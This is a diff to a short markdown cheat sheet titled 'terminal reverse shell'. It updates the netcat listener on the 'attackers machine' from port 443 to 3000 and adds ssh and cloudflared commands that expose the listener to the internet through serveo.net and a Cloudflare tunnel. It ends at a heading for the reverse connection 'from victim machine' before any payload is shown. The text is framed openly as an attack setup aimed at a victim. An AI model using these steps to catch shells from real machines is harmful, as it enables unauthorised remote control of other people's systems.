@@ -1,11 +1,12 @@
 # terminal reverse shell
 
 ## open listener port on attackers machine
-* `nc -v -lp 443`
-* macOS `nc -v -l 443`
+* `nc -v -lp 3000`
+* macOS `nc -v -l 3000`
 
 #### optional - get public address by creating a tcp reverse tunnel
-`ssh -R 443:localhost:443 serveo.net`
+- `ssh -R 0:localhost:3000 serveo.net`
+- `cloudflared tunnel --url tcp://localhost:3000`
 
 ## reverse connect from victim machine to attackers machine
 ### bash
